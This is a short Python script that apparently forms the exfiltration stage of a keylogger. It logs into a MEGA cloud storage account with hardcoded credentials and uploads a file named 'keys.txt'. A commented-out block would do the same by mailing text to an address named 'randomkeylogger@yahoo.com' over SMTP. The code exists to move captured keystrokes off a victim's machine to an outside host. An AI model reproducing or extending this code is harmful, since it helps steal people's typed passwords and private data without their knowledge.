# import ssl
# import smtplib

# port = 1025

# with smtplib.SMTP("smtp.mailtrap.io", port) as server:
#     # server.ehlo()
#     server.starttls()
#     server.login("totallylegit4sure@gmail.com", "abcd1234")
#     server.sendmail("totallylegit4sure@gmail.com",
#                     ["randomkeylogger@yahoo.com"], "txt txt txt")



from mega import Mega

mega = Mega()
mega.login("totallylegit4sure@gmail.com","youfoundit")
file = "keys.txt"
mega.upload(file) 